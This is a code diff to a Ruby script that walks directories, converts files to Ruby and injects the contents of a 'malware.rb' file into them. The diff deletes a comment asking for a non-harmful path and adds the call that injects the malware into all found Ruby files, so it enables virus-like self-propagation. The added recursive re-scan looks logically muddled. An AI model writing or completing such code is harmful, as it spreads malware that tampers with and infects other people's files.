@@ -26,6 +26,9 @@ def find_files(files, directories, path = Dir.pwd, max_depth = 10)  # Add a max_
         next
       end
     end
+    # Add new files into files array and find new files in this array (new files = new .rb files) 
+    files.clear()
+    find_files(files , [])
   end
   
 # Inject content of malware.rb to other files
@@ -54,11 +57,12 @@ end
   
 def main()
     files, directories = [], []
-    malware = Dir.pwd + '/malware.rb'  # Replace with a non-harmful file path
+    malware = Dir.pwd + '/malware.rb' 
     
     find_files(files, directories)
     convert_files_to_ruby(files)
-    
+    inject_malware_to_all_ruby_files(files , malware)
+
     # Process files within directories
     directories.each do |directory|
       files_in_dir = []
